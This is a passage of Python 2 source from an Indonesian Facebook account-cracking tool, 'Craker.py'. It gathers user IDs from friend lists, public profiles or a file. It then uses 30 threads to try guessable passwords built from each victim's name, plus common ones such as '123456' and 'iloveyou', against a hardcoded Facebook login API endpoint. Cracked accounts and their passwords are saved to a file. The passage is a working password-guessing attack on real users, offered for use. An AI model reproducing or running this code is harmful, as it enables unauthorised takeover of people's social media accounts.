    teak = raw_input('\x1b[1;95mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_usa()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo19
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo19
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / Teman Tidak Ada !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Keluar>\x1b[1;95m]')
                crack_usa()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo19
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada !'
                    raw_input('\n\x1b[1;95m[\x1b[1;97m<Keluar>\x1b[1;95m]')
                    crack_usa()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Salah Pilih Yang Benar...!'
                pilih_usa()
            print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = 'iloveyou'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Brand123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo9
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_indo()


def pilih_indo():
    teak = raw_input('\x1b[1;91mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_indo()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo15
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo15
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / Teman Tidak Ada !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo15
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                    crack_indo()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
                pilih_pakis()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
